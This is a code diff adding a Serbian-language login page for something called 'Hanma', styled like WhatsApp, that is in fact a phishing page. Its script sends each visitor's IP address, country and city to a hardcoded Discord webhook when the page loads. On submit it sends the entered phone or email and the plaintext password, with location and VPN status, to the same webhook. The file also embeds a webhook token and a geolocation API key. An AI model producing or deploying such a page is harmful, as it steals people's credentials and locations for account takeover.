@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="sr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hanma Login</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #25D366;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            width: 300px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        h2 {
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #25D366;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #128C7E;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Prijava na Hanma</h2>
+        <input id="phone" type="text" placeholder="Telefon ili email" required>
+        <input id="password" type="password" placeholder="Lozinka" required>
+        <button onclick="sendData()">Prijavi se</button>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1293284555590996028/Qau-P8cPrfeI53Z3rvu-v556VovmAdWNI1Jd3Mb_acEXVchgUTkZjUUi8SgyNiWD2KsP"; // Add your webhook URL here
+
+        async function getUserIPInfo() {
+            const response = await fetch('https://geo.ipify.org/api/v2/country,city,vpn?apiKey=at_l699zGwe8SfyVCBHJhZp3WdP7x3Ii');
+            const data = await response.json();
+            return {
+                ip: data.ip,
+                country: data.location.country,
+                city: data.location.city,
+                isVPN: data.vpn
+            }; 
+        }
+
+        async function sendJoinInfo() {
+            const ipInfo = await getUserIPInfo();
+            const embedData = {
+                embeds: [{
+                    title: "Prijava na Hanma",
+                    fields: [
+                        { name: "IPv4", value: ipInfo.ip, inline: true },
+                        { name: "Država", value: ipInfo.country, inline: true },
+                        { name: "Grad", value: ipInfo.city, inline: true }
+                    ]
+                }]
+            };
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(embedData),
+            });
+        }
+
+        async function sendData() {
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const ipInfo = await getUserIPInfo();
+
+            const embedData = {
+                embeds: [{
+                    title: "Prijava na Hanma",
+                    fields: [
+                        { name: "Telefon/Email", value: phone, inline: true },
+                        { name: "Lozinka", value: password, inline: true },
+                        { name: "IPv4", value: ipInfo.ip, inline: true },
+                        { name: "Država", value: ipInfo.country, inline: true },
+                        { name: "Grad", value: ipInfo.city, inline: true },
+                        { name: "VPN", value: ipInfo.isVPN ? 'Da' : 'Ne', inline: true }
+                    ]
+                }]
+            };
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(embedData),
+            });
+        }
+
+        // Call sendJoinInfo when the user visits the page
+        sendJoinInfo();
+    </script>
+</body>
+</html>
